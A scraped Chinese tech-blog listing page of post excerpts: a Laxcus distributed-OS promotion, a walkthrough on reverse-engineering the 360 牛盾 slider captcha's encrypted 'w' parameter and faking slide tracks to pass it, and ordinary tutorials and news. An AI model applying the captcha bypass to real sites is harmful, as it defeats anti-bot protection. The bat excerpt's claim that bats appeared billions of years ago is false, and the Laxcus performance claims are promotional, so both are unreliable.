曾经有人问Laxcus计算能力能够达到多少FLOPS。在这里纠正一下，FLOPS这类参数主要是用来评价CPU、GPU处理器和计算机性能的指标，Laxcus 7.0属于计算机软件，对于Laxcus 7.0来说，用支持计算节点数量，和每个计算节点对CPU、GPU支持能力做判断指标更合适。根据我们的测试，Laxcus 7.0在RDMA网络（比如IB网）里，主控节点如果能够采用最新主流CPU，带宽在GB规模以上，对计算机集群支持规模能够达到10,000台计算机，超过这个节点规模，由于网络间通讯、计算IO、和软硬件的原因，稳定性会出现波动，影响系统整体运行。当然，未来随着硬件性能进一步提高，10,000台计算机节点的参数还可能进一步提高。
6. 兼容Linux生态
从产品定位来说，Laxcus属于服务器和服务器的计算机集群操作系统，这个领域目前是Linux主导。所以为了不影响Linux用户的使用习惯，维护Linux生态，Laxcus 7.0将全面兼容Linux生态，也就是说，目前在Linux上运行的所有应用软件，包括上面提到地K8s等关键应用，都可以无缝迁移到Laxcus上运行。
7. 开辟新的分布式应用生态
Laxcus 7.0能够聚合海量的计算机，为应用业务赋予超大规模的计算能力，传统的基于单机操作系统，比如Linux平台的应用软件并不具备这种计算范式。因此，更为实现更快更强的计算效率，Laxcus需要打造自己的分布式应用生态。就象Windows平台的应用软件依赖它的系统函数库一样，Laxcus分布式应用软件也将基于分布式系统库DSDK实现。Laxcus分布式应用软件有什么优势呢？举一个简单例子：假如在Linux平台上运行一项计算工作需要1个小时，放在Laxcus平台上，如果有60台计算机参与，结合Laxcus DSDK并行计算，时间将降低到1分钟，如果是120台计算机，时间是30秒。Laxcus 7.0能够大幅加速计算效率，节约计算时间，这就是分布式并行计算的价值和意义。
8. 应用场景
通过上面介绍，各位应该知道，Laxcus优势在于它强大的计算机集群管理和并行处理能力，这样的能力，是当前算力中心、数据中心、超级计算机、云计算、物联网、车联网、人工智能最需要的，所以Laxcus分布式操作系统并不是给普通个人使用的操作系统，属于后端操作系统。它的应用方面为企业、政府、军事、科研为主的应用场景。除非个人和某些团队有某些特殊的需要，比如挖矿之类的工作，Laxcus基本对于个人绝缘。
9. 为什么开发Laxcus
这是最近很多人私信问的最多的一个。这样一并回答，一言以蔽之：时代变了，传统操作系统也需要革新了。如果回顾计算机产业，从它诞生之初到现在，每个时代都有属于这个时代的操作系统。在大型机时代，当时顶流的操作系统是IBM OS360，到了小型机时代，Unix成为当红炸子鸡，到了PC时代，Windows和Macintosh领导了图形操作系统风潮，进行手机时代，iOS和Android登上操作系统顶峰。
现在是人工智能主导下的算力时代，传统的操作系统已经无法支持规模庞大的计算机集群，和提供海量的计算能力。所以英伟达黄仁勋在N年前就提出要重构计算体系，目前英伟达已经通过GPU实现算力的强力输出。做为算力体系中的一环，在操作系统上，Laxcus 7.0将利用十年来在软件算力经验中的积累，通过“让计算更快更简单”，实现软件计算能力和计算效率强力输出。为了达成这个目的， 我们正在通过操作系统，从底层架构到编程接口、应用软件，对计算体系进行重构。人工智能主导下的算力市场，是一个巨大的风口，它的市场规模超过万亿美元。
10. 技术架构
很多技术人很关心Laxcus 7.0的技术架构，放一张图出来让大家看看。简单说，在Laxcus计算体系中，底层是各种的异构计算机，Laxcus会对它们进行有区别但一致管理，并在逻辑上整合为一个整体。不管实际上有多少台计算机，当用户使用时都好象操作一台计算机一样。在Laxcus的上层，是以图形桌面和字符控制台为入口的交互界面，用户将通过图形界面和字符界面实现人工交互。Laxcus的工作职责是完成对计算机集群中每个节点的管理工作，并保证它们稳定可靠地运行。应用软件在Laxcus计算体系中，处理具体的专业的计算业务，比如存储、大数据、人工智能、数据库、科学计算，都属于应用层面的工作。
Laxcus做为一个后端的操作系统，在未来，还将接入更多的新的轻量级的小型化设备，赋能各个应用领域，赋能更多智能应用领域。
以上就是Laxcus分布式操作系统7.0的大致情况。
目前Laxcus分布式操作系统研发团队正在扩招中，招聘岗位包括：技术合伙人、项目主管、核心开心人员，公司提供了丰厚的股权和期权奖励回报，欢迎“有想法”和“不安分”的小伙伴联系我，加入Laxcus分布式操作系统研发团队，抓住下一轮的算力市场发展红利！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48714be368d889823e91c8994b478cc7/" rel="bookmark">
			js逆向-360牛盾验证码逆向分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		声明 本文仅供学习参考，如有侵权可私信本人删除，请勿用于其他途径，违者后果自负！
如果觉得文章对你有所帮助，可以给博主点击关注和收藏哦！
插句个人内容：本人最近正在找工作，工作城市：广州。如果有合适的机会，希望有大佬可以内推，感激不尽。🙏
js逆向马马虎虎，app会弱一些。感兴趣的大佬可以私信本人要简历。
参数分析 此次的目标依然十分明确，通过算法过掉验证码。
这个验证码是我无意中发现的，也比较小众，难度不是很大，所以拿来分析一下。
页面长这个样子
F12抓包看一下情况
这个请求包含了背景图片和滑块图片的url，以及需要的token。
然后就是拖动滑块进行验证。
再观察一下请求体内容。
参数实际上校验了token和w，token的值是上个请求返回的，那么也就是需要将w的值分析出来就可以了。
定位加密函数与本地复现 全局搜索token，可以轻松的定位到w的位置。
m则在上方已经定义了，重新断点，观察参数。
比较关键的是offsetArr和position，分别对应滑动数组和滑动距离，其他参数测试下来均可写死，不影响。
n.default则是JSON.stringify。
参数c是token，l则是固定值。
进入y函数。
典型AES加密，本地直接套用crypto-js库，将混淆部分直接手动解密。
本地复测发现结果一致，那么这个加密就完成本地复现了。
加密部分完成之后还有轨迹和位置没有找到，接着向上追栈。
此时位置已经当做参数传了进来，所以需要接着向上找。
滑动距离=实际距离*比例
滑动距离识别有很多方法可以实现，比如打码平台和本地ocr。
使用ddddocr发现效果也不错，需要注意图片的实际大小。
至于offsetArr的特征可以看到固定首尾中间生成随机数，然后将数组变成字符串就大功告成了
验证结果 结果当然也是成功的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4b78a4d8602154f5c07d3f0112a0b39/" rel="bookmark">
			PythonPDF编辑库之pypdf使用详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概要 PDF（Portable Document Format）是一种常见的文档格式，广泛用于存储和共享文本和图像数据。在 Python 中，有许多库可以用于处理 PDF 文件，其中之一就是 PyPDF。PyPDF 是一个功能强大的库，它允许你读取、创建和操作 PDF 文件。本文将介绍 PyPDF 的基本概念、安装方法以及一些常见的用法示例，以帮助大家开始使用 PyPDF 处理 PDF 文件。
什么是 PyPDF？ PyPDF 是一个用于处理 PDF 文件的 Python 库。它提供了一组工具和功能，用于读取、解析和操作 PDF 文件的内容。
安装 PyPDF 要开始使用 PyPDF，首先需要安装它。可以使用 pip 命令来安装 PyPDF2（PyPDF 的常用版本）：
pip install PyPDF2 安装完成后，就可以在 Python 中导入 PyPDF2 模块，并开始处理 PDF 文件。
基本用法示例 1. 读取 PDF 文件内容 使用 PyPDF，可以轻松读取 PDF 文件中的文本内容。
以下是一个示例，演示了如何打开一个 PDF 文件并提取其文本内容：
import PyPDF2 # 打开 PDF 文件 pdf_file = open('example.pdf', 'rb') # 创建 PDF 读取器对象 pdf_reader = PyPDF2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b4b78a4d8602154f5c07d3f0112a0b39/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f8869ec249cb9055b456c44940f7608/" rel="bookmark">
			如何在html5中的canvas绘制文本自动换行？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在这篇文章中我们讲解了怎么解决canvas绘图过程中，drawText的换行问题，先看一个大家平时在canvas绘制文本都会遇到的问题：
一个150*100的canvas画布，加个边框明显边界
&lt;canvas id="canvas" style="border:solid 1px darkgoldenrod;" width="200px" height="100px"&gt;&lt;/canvas&gt; 我们先来看​fillText()​方法，​strokeText()​方法同理
var c=document.getElementById("canvas"); var ctx=c.getContext("2d"); ctx.fillStyle="#E992B9"; ctx.lineWidth=1; var str = "假如生活欺骗了你，请不要悲伤！thank you!" ctx.fillText(str,0,20); 可以看到​fillText()​在固宽的 canvas 中，字数过多的时候，并不会自动换行，我们可以增加 canvas 本身的宽度，但这不是解决问题的根本方法。还记得之前介绍 canvas 基本 api 的时候，有一个函数，context.measureText(text) 这个函数可以测量字体的宽高度，那就好办了，我们计算好我们字符串的长度加上一个大概的宽度，基本上可以处理这种换行的问题了。
下面看具体实现方法：
var c=document.getElementById("canvas"); var ctx=c.getContext("2d"); ctx.fillStyle="#E992B9"; ctx.lineWidth=1; var str = "假如生活欺骗了你，请不要悲伤！thank you!" var lineWidth = 0; var canvasWidth = c.width;//计算canvas的宽度 var initHeight=15;//绘制字体距离canvas顶部初始的高度 var lastSubStrIndex= 0; //每次开始截取的字符串的索引 for(let i=0;i&lt;str.length;i++){ lineWidth+=ctx.measureText(str[i]).width; if(lineWidth&gt;canvasWidth){ ctx.fillText(str.substring(lastSubStrIndex,i),0,initHeight);//绘制截取部分 initHeight+=20;//20为字体的高度 lineWidth=0; lastSubStrIndex=i; } if(i==str.length-1){//绘制剩余部分 ctx.fillText(str.substring(lastSubStrIndex,i+1),0,initHeight); } } 见效果图： 算法：计算字符串 str 里面每个字符的宽度的和​lineWidth​，如果大于 canvas 的宽度，就截取这部分进行绘制，然后重置​lineWidth​，保存开始截取的最后的索引，当循环变量 i 为最后一个字符的时候，直接绘制剩余部分。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9f8869ec249cb9055b456c44940f7608/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f73012b1af4273bd71320b2a5b51399/" rel="bookmark">
			利用aiohttp异步爬虫实现网站数据高效抓取
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 大数据时代，网站数据的高效抓取对于众多应用程序和服务来说至关重要。传统的同步爬虫技术在面对大规模数据抓取时往往效率低下，而异步爬虫技术的出现为解决这一问题提供了新的思路。本文将介绍如何利用aiohttp异步爬虫技术实现网站数据抓取，以及其在实际应用中的优势和注意事项。
一、aiohttp简介 aiohttp是一个基于asyncio的异步HTTP客户端/服务器框架，它提供了一种简单而强大的方式来处理异步HTTP请求。通过利用Python的async/await语法，aiohttp可以实现高效的异步网络通信，非常适合构建异步爬虫。
二、异步爬虫原理 传统的同步爬虫在处理HTTP请求时往往是一次只能处理一个请求，当需要抓取大量数据时，效率就会受到限制。而异步爬虫则可以同时处理多个HTTP请求，从而很大程度上提高了抓取数据的效率。在异步爬虫中，我们可以利用async/await语法来定义异步任务，通过事件循环来调度这些任务的执行，从而实现高效的数据抓取。
三、利用aiohttp实现异步爬虫 首先安装aiohttp，我们需要安装aiohttp库，可以通过pip命令进行安装： 巴什 复制 pip install aiohttp 编写异步爬虫代码接下来的数据，我们可以编写异步爬虫的代码。以下是一个简单的示例代码，用于利用aiohttp实现异步爬虫网站： Python 复制 import aiohttp import asyncio async def fetch(session, url): async with session.get(url) as response: return await response.text() async def main(): async with aiohttp.ClientSession() as session: tasks = [fetch(session, 'http://example.com') for _ in range(10)] htmls = await asyncio.gather(*tasks) for html in htmls: print(html) if __name__ == '__main__': loop = asyncio.get_event_loop() loop.run_until_complete(main()) 在这个例子中，我们首先定义了一个fetch函数，用于发起异步的HTTP请求。然后在main函数中，我们创建了一个aiohttp的ClientSession，同时引发了多个HTTP请求，最后asyncio.gather来等待所有请求的完成，并处理返回的数据。
四、利用aiohttp实现异步爬虫的优势 实现异步爬虫具有以下几个优势：
高效性：异步爬虫可以同时处理多个HTTP请求，极大地提高了数据抓取的效率。可扩展性：异步爬虫可以轻松地划分大规模的数据抓取任务，而不会受到性能的限制。资源利用率高：异步爬虫可以更好地利用系统资源，减少不必要的等待时间。 五、注意事项 在使用aiohttp实现异步爬虫时，需要注意以下几点：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9f73012b1af4273bd71320b2a5b51399/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5a51fdb4aba9885d08153863cfd08092/" rel="bookmark">
			蝙蝠优化算法的matlab性能仿真
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.蝙蝠优化原理
1.1 蝙蝠的速度和位置更新
1.2 响度和脉冲发生率更新
1.3 算法步骤
2.MATLAB程序
3.仿真结果
蝙蝠是种神奇的动物。 科学家认为，最早的蝙蝠出现在 65-100 亿年前，曾与恐龙并肩生活。 蝙蝠是唯一有翅膀的哺乳动物。 蝙蝠的种类拥有 1300 多种。 除了极地高寒地区之外，它们几乎无处不在。 白天间，它们躲在避难所里。 为了在黑暗的洞穴中导航，并在天黑后狩猎，蝙蝠依靠回声定位，该系统允许它们依靠声波检测物体。 它们通过发出高频声波的回声定位，该声波向前移动，直到它击中物体，并被反射回来。 回声定位是一种声纳：蝙蝠发出响亮而短促的脉冲声波。 当声波到达物体时，回声会在短时间内反射回到蝙蝠的耳朵，这就是蝙蝠在空间中定位自己，并判定猎物位置的方式。
蝙蝠优化算法（Bat Algorithm, BA）是一种基于蝙蝠回声定位行为的启发式优化算法，用于解决连续优化问题。该算法模拟了蝙蝠在寻找食物或避免障碍物时利用回声进行空间定位的行为。蝙蝠通过发出声波，这些声波在环境中传播并在遇到障碍物时反射回来，通过分析反射声波，蝙蝠能够确定障碍物的位置、大小甚至形状。蝙蝠优化算法将蝙蝠的回声定位行为转化为优化问题的搜索过程，通过模拟蝙蝠的飞行和回声定位来寻找问题的最优解。
1.蝙蝠优化原理 蝙蝠优化算法的核心思想是模拟蝙蝠的回声定位能力和飞行行为。在算法中，每只蝙蝠代表一个解，蝙蝠的位置和速度分别对应解的参数和搜索方向。蝙蝠在搜索空间中飞行，并根据回声定位的结果调整其飞行速度和位置，以寻找更好的解。
1.1 蝙蝠的速度和位置更新 蝙蝠的位置和速度在每一代中都会更新。假设蝙蝠 (i) 在 (t) 时刻的位置和速度分别为 (x_i^t) 和 (v_i^t)，则其在 (t+1) 时刻的位置和速度更新公式如下：
式中，β是随机数，服从[01]均匀分布。
1.2 响度和脉冲发生率更新 脉冲发射的响度Ai和脉冲发生率ri要随着迭代过程的进行来更新。蝙蝠一旦发现了猎物，响度会逐渐降低，同时脉冲速率就会提高，响度会以任意简便值改变。
其中，α和γ是常量。参数的选择需要一定的经验。初始时，每只蝙蝠所发出的响度和脉冲发生率的值都是不同的，这可以通过随机选择。初始的响度A0i0通常在[0,1][0,1]之间，而初始脉冲发生率一般去在0附近。
1.3 算法步骤 初始化蝙蝠种群，包括每只蝙蝠的位置、速度、频率、响度和脉冲发射率。评估每只蝙蝠的适应度（即目标函数值）。找到当前种群中的最优解 (x_*)。对于每只蝙蝠，根据其当前位置和速度更新其下一时刻的位置和速度。根据一定的概率，对蝙蝠的位置进行局部搜索，以增强算法的局部搜索能力。更新蝙蝠的频率、响度和脉冲发射率。重复步骤 2-6，直到达到终止条件（如最大迭代次数或解的质量满足要求）。 2.MATLAB程序 ....................................................................... % 记录一组最优值 [bestfitness,bestindex]=min(fitness); zbest=pop(bestindex,:); % 全局最佳 gbest=pop; % 个体最佳 fitnessgbest=fitness; % 个体最佳适应度值 fitnesszbest=bestfitness; % 全局最佳适应度值 %% 迭代寻优 for i=1:maxiter i for j=1:sizepop Q = Qmin + (Qmax-Qmin)*rand; V(j,:) = V(j,:) + (pop(j,:)-zbest)*Q; % V--x1 if V(j,1)&gt;Vmax V(j,1)=Vmax; end if V(j,1)&lt;Vmin V(j,1)=Vmin; end % V--x2 if V(j,2)&gt;Vmax V(j,2)=Vmax; end if V(j,2)&lt;Vmin V(j,2)=Vmin; end pop(j,:) = pop(j,:) + 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5a51fdb4aba9885d08153863cfd08092/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e2c6204696e0ade813e74a27f052092/" rel="bookmark">
			【简单易懂】Java中字符的输入
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
Java中字符的输入
1. 读取单个字符：
2. 读取整行字符： 3. 读取多个字符：
Java中字符的输入 当涉及到在Java中获取字符输入时，可能会涉及不同的情况，包括读取单个字符、读取整行字符等。下面，我将分别说明这些情况：
1. 读取单个字符： import java.util.Scanner; public class CharInputExample { public static void main(String[] args) { Scanner scanner = new Scanner(System.in); System.out.print("请输入一个字符: "); // 读取用户输入的字符 char userInput = scanner.next().charAt(0); System.out.println("你输入的字符是: " + userInput); scanner.close(); } } 这里使用next()方法读取整个字符串，然后通过charAt(0)获取第一个字符。
2. 读取整行字符： import java.util.Scanner; public class LineInputExample { public static void main(String[] args) { Scanner scanner = new Scanner(System.in); System.out.print("请输入一行字符: "); // 读取用户输入的整行字符串 String userInput = scanner.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e2c6204696e0ade813e74a27f052092/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98dafaba992f52e67d7964a3db0589b1/" rel="bookmark">
			数据结构—基础知识（13）：树的存储结构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 数据结构—基础知识（13）：树的存储结构 双亲表示法 这种表示方法中，以一组连续的存储单元存储树的结点，每个结点除了数据域data外，还附设一个parent域用以指示其双亲结点的位置。
这种存储结构利用了每个结点（除根结点外）只有唯一的双亲性质。这种存储结构下，求结点的双亲十分方便，也很容易求树的根，但求结点的孩子时需要遍历整个结构。
孩子表示法 由于树中每个结点可能有多棵子树，则可用多重链表，即每个结点有多个指针域，其中每个指针指向一棵子树的根结点，此时链表中的结点可以有如下图的两种结点格式。
若采用第一种结点格式，则多重链表中的结点是同构的，其中d为树的度。由于树中很多结点的度小于 d，所以链表中有很多空链域，空间较浪费，不难推出，在一棵有n个结点度为k的树中必有n(k-1)+1 个空链域。
若采用第二种结点格式，则多重链表中的结点是不同构的，其中d为结点的度，degree 域的值同d。此时，虽能节约存储空间，但操作不方便。
另一种办法是，把每个结点的孩子结点排列起来，看成是一个线性表，且以单链表做存储结构，则n个结点有n个孩子链表(叶子的孩子链表为空表)。而n个头指针又组成一个线性表，为了便于查找，可采用顺序存储结构。
下图(a)所示为下图中的树的孩子表示法。与双亲表示法相反，孩子表示法便于那些涉及孩子的操作的实现。可以把双亲表示法和孩子表示法结合起来，即将双亲表示和孩子链表合在一起。图(b)所示的就是这种存储结构的一例，它和图(a)表示的是同一棵树。
孩子兄弟法 孩子兄弟法又称二叉树表示法，或者二叉链表表示法，即以二叉链表做树的存储结构。链表中结点的两个链域分别指向该结点的第一个孩子结点(firstchild)和下一个兄弟结点(nextsibling)
//------树的二叉链表（孩子—兄弟）存储表示------ typedef struct CSNode{ ElemType data; struct CSNode *firstchild,*nextsibling; }CSNode,*CSTree; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e094f6a54a0756b81e967d848198b63/" rel="bookmark">
			架构整洁之道-设计原则
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		4 设计原则 通常来说，要想构建一个好的软件系统，应该从写整洁的代码开始做起。这就是SOLID设计原则所要解决的问题。
SOLID原则的主要作用就是告诉我们如何将数据和函数组织成为类，以及如何将这些类链接起来成为程序。请注意，这里的“类”并不意味着SOLID原则只适用于面向对象编程，这里的类仅仅代表了一种数据和函数的分组，每个软件都会有自己的分类系统，不管它们各自是不是将其称为“类”，事实上都是SOLID原则的适用领域。
一般情况下，我们为软件构建中层结构的主要目标如下：
(1) 使软件可容忍被改动；
(2) 使软件更容易被理解；
(3) 构建可在多个软件系统中复用的组件；
我们这里之所以会使用“中层”这个词，是因为这些设计原则主要适用于那些进行模块级编程的程序员。SOLID原则应该直接紧贴于具体的代码逻辑之上，这些原则是用来帮助我们定义软件架构中的组件和模块的。
SOLID原则是指：
(1) 单一职责原则（Single Responsibility Principle，SRP），每个类都应该只有一个引起它变化的原因，换句话说，一个类应该只有一个职责或功能，当需求改变时，会影响这个类的修改只应与该职责相关；
(2) 开闭原则（Open-Closed Principle，OCP），类模块应该是对扩展开放的（open for extension），对修改关闭的（closed for modification），也就是说，已有的代码在不改动的情况下可以增加新的行为，通过继承和多态来实现新功能的添加而不是修改已有的代码；
(3) 里氏替换原则（Liskov Substitution Principle，LSP），子类型必须能够替换掉它们的基类型，这意味着任何使用基类型的地方，子类型都可以无缝替代，并且不会导致程序的行为出现错误或异常；
(4) 接口隔离原则（Interface Segregation Principle，ISP），客户端不应该被迫依赖它们不需要的方法，接口应该小而具体，每个接口代表一种独立的责任或服务，这样可以使系统更松散耦合且更易复用；
(5) 依赖倒置原则（Dependency Inversion Principle，DIP），高层模块不应该依赖低层模块，二者都应当依赖其抽象，抽象不应依赖细节，细节应当依赖抽象，这个原则强调了依赖于抽象而非具体实现的重要性，通过依赖注入等方式实现，有助于提供代码的可扩展性和可测试性；
4.1 单一职责原则（Single Responsibility Principle） SRP很容易被误解为“每个模块都应该只做一件事”，而实际上，这只是SRP的一部分，实际上SRP应该被描述成“任何一个软件模块都应该只对某一类行为负责”。这里的软件模块是指一组紧密相关的函数和数据结构。在这里，“相关”这个词实际上就隐含了SRP这一原则。代码与数据就是靠着与某一类行为者的相关性被组合在一起的。
我们来看一些反面案例。
4.1.1 重复的假象 某个工资管理程序中的Employee类有三个函数calculatePay()、reportHours()和save()：
如上所述，这个类的三个函数分别对应的是三类非常不同的行为者，违反了SRP设计原则：
(1) calculatePay()函数是由财务部门制定的，他们负责向CFO汇报；
(2) reportHours()函数是由人力资源部门制定并使用的，他们负责向COO汇报；
(3) save()函数是由DBA制定的，他们负责向CTO汇报；
这三个函数被放在同一个源代码文件，即同一个Employee类中，程序员这样做实际上就等于使三类行为者的行为耦合在了一起，这有可能会导致CFO团队的命令影响到COO团队所依赖的功能。例如，calculatePay()函数和reportHours()函数使用同样的逻辑来计算正常工作时数，程序员为了避免重复编码，通常会将该算法单独实现为一个名为regularHours()的函数：
接下来，假设CFO团队需要修改正常工作时数的计算方法，而COO带领的HR团队不需要这个修改，因为他们对数据的用法是不同的，这时候，负责这项修改的程序员会注意到calculatePay()函数调用了regularHours()函数，但可能不会注意到该函数会同时被reportHours()调用。于是，该程序员就这样按照要求进行了修改，同时，CFO团队的成员验证了新算法正常工作，这项修改最终被成功部署上线了。但是，COO团队显然完全不知道这些事情的发生，HR仍然在使用reportHours()产生的报表，随后就会发现他们的数据出错了！
这类问题发生的根源就是因为我们将不同行为者所依赖的代码强凑到了一起，对此，SRP强调这类代码一定要被分开。
4.1.2 代码合并 一个拥有很多函数的源代码文件必然会经历很多次代码合并，该文件中的这些函数分别服务不同行为者的情况就更常见了。
例如，CTO团队的DBA决定要对Employee数据库表结构进行简单修改，与此同时，COO团队的HR需要修改工作时数报表的格式。这样一来，就很可能出现两个来自不同团队的程序员分别对Employee类进行修改的情况。不出意外的话，他们各自的修改一定会互相冲突，这就必须要进行代码合并。
在这个例子中，这次代码合并不仅有可能让CTO和COO要求的功能出错，甚至连CFO原本正常的功能也可能受到影响。
事实上，这样的案例还有很多，它们的一个共同点是，多人为了不同的目的修改了同一份源代码，这很容易造成问题的产生。而避免这种问题产生的方法就是将服务不同行为者的代码进行切分。
4.1.3 解决方案 我们有很多不同的方法可以用来解决上面的问题，每一种方法都需要将相关的函数划分成不同的类。其中最简单直接的办法是将数据与函数分享，设计三个类共同使用一个不包括函数、十分简单的EmployeeData类，每个类只包含与之相关的函数代码，互相不可见，这样就不存在互相依赖的情况了。
这种解决方案的坏处在于：程序员现在需要在程序里处理三个类。
另一种解决办法是使用Facade设计模式：
这样一来，EmployeeFacade类所需要的代码量就很少了，它仅仅包含了初始化和调用三个具体实现类的函数。
当然，也有些程序员更倾向于把最重要的业务逻辑与数据放在一起，那么我们可以选择将最重要的函数保留在Employee类中，同时用这个类来调用其他没那么重要的函数：
总而言之，每一个类都分别容纳了一组作用于相同作用域的函数，而在该作用域之外，它们各自的私有函数是互相不可见的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e094f6a54a0756b81e967d848198b63/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7d8c9b6445b6640742e98a84c2486f18/" rel="bookmark">
			华为宣布：HarmonyOS NEXT星河版重磅发布！网友狂喊马化腾：微信、QQ快适配
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		会议之眼 快讯
华为于2024年1月18日在深圳举行"鸿蒙生态千帆启航"发布会，这次发布会正式揭开了华为全新一代原生鸿蒙操作系统HarmonyOS NEXT的面纱，即鸿蒙星河版。从2019年首次发布HarmonyOS到今天，这片星空中的星光从未熄灭过。如今，在满天的星光汇聚之下，华为终于打造出了一个耀眼的星河！鸿蒙星河版以全新的架构、全新的体验和全新的生态系统震撼亮相！
华为常务董事、消费者BG CEO余承东表示，鸿蒙生态设备已经达到了8亿，而鸿蒙将进一步开辟万亿级产业的新蓝海！同时，华为也正式向全球开发者开放申请，迎来了无数开发者们的加入。
“纯血鸿蒙”
在余承东看来，鸿蒙系统现在“真正拥有了坚实的底座”。鸿蒙OS NEXT版本被外界誉为“纯血鸿蒙”，因为这个版本的底层完全由华为自主研发，摒弃了Linux内核和AOSP安卓开放源代码项目的代码。这一重大发布无疑为华为鸿蒙生态注入了新的活力！
自从鸿蒙系统首次亮相以来，华为凭借其独特的分布式技术、流畅的用户体验和强大的互联能力赢得了业界和消费者的广泛好评。而这次发布的鸿蒙星河版更在原有基础上进行了全面升级，将带给用户更加极致的原生体验。鸿蒙星河版将实现原生精致、原生易用、原生流畅、原生安全、原生智能、原生互联六大极致原生体验。这无疑为用户带来了更加令人惊艳的用户体验！
鸿蒙原生应用版图
华为称，其将在2024年二季度发布开发者Beta（测试）版，2024年四季度发布商用版，正式面向普通消费者！华为表示，鸿蒙原生应用已经逐步成型，目前首批200多个适配原生鸿蒙的应用正快速加入生态圈。从已经公布的部分应用来看，我们喜爱的支付宝、美团、高德地图、微博、小红书、钉钉、QQ音乐、B站等头部应用均已推出鸿蒙原生应用，可谓是应有尽有。然而，不得不提到腾讯旗下的QQ和微信并未在其中，这令人有些失望。众多网友疯狂喊话马化腾尽快跟进，加入鸿蒙生态大家庭，给用户带来更好的体验！
美团是鸿蒙生态的早期合作伙伴之一，他们成为了鸿蒙生态开发多模块协作设计的领头羊。令人惊叹的是，美团仅用了短短的6周时间就成功地开发出了首个鸿蒙星河版核心功能，并成功地点出了第一份“鸿蒙外卖”。
值得一提的是，鸿蒙原生应用具有独特的特点。例如，同程旅行在现场展示中介绍到，他们是第一个实现鸿蒙原生半透明主题的应用。这一创新使得用户在购票、订酒店等过程中能够享受更加流畅的交互体验，大大提升了行程规划和旅行产品预订的顺畅度。这种创新的设计让用户感受到前所未有的便捷和舒适。
HarmonyOS SDK
华为为了支持开发者开发和优化鸿蒙原生应用，提供了全链路的开发工具和能力。HarmonyOS SDK将系统级能力全面对外开放，覆盖了应用框架、应用服务、系统、媒体、图形、AI六大领域的开发能力，为开发者带来简洁、高效的开发体验，开发者只需通过API调用即可实现丰富的鸿蒙原生应用功能和独特体验。同时，在开发效率上，HarmonyOS SDK更进一步，通过整合开发高频场景推出场景化控件，帮助开发者快速地打造更纯净、更智能、更精致、更易用的鸿蒙原生应用。
提供六大领域，能力丰富完备
HarmonyOS SDK拥有近30000个API，覆盖了鸿蒙原生应用开发、部署和维护的全生命周期。HarmonyOS SDK基于开发者开发所需要的功能和特性提供了六大领域：应用框架领域提供包括ArkTS、 ArkUI等移动应用开发的基础设施，帮助开发者高效构建稳定流畅的鸿蒙原生应用；媒体领域通过Audio Kit、Media Kit助力打造超清、流畅、高能效的音视频体验；图形领域提供软硬协同的图形能力，持续构建高画质、高流畅、低功耗的鸿蒙原生游戏体验；AI领域提供AI基础能力、AI控件、意图框架分层开放，使能应用原生智能；系统领域中一系列安全控件，为可信的开发和运行环境筑基，丰富的通信服务让多端互联更近一步；应用服务领域提供推送、支付等基础Kit，全新的全场景协同开放能力，轻松实现应用跨端流转。
场景化控件，鸿蒙原生应用开发化繁为简
除了上述丰富完备的开放能力，HarmonyOS SDK为了进一步提升开发效率，为开发者们带来了全新的场景化控件。场景化控件通过把用户态常用的操作组合（包括但不限于UI、逻辑和数据）整合在一起，并对其进行针对性的性能优化、体验打磨，为开发者提供标准化服务控件，从而提升复杂场景的开发效率。例如华为账号一键登录控件，支持开发者快速集成满足规范要求的登录按钮，并提供统一的授权登录交互UI，尽可能的简化API调用次数；地图选点控件，提供统一地点选择和地点搜索能力，仅需1个API、约10行代码，即可降低开发者接入门槛，实现用户在地图上选择所需地点此类场景的使用体验。
焕然一新的鸿蒙原生应用：更纯净、更智能、更精致、更易用
应用上架后的用户体验，也是开发者最关注的。HarmonyOS SDK提供的9类安全控件可以在用户使用应用过程中减少70%的弹窗，在确保用户主动意愿下，按需提供授权，让应用更简洁纯净，带给用户清爽、安全的使用体验。另外，HarmonyOS SDK将Input、Text、Image等在内的10+常用控件AI化，为用户提供多种场景下更贴心的智能化体验，如Image控件支持在浏览图片、查看备忘录、聊天场景下对图片快速提取文本，操作简单直接，体验统一。在UI界面设计上，UI组件采用去繁从简的审美风格，40多个动效API帮助开发者打造富有空间感，精致细腻的视觉效果。同时，HarmonyOS SDK提供了一接即用的场景化控件，把应用常用的操作整合在一起，用户一处会用，处处会用。
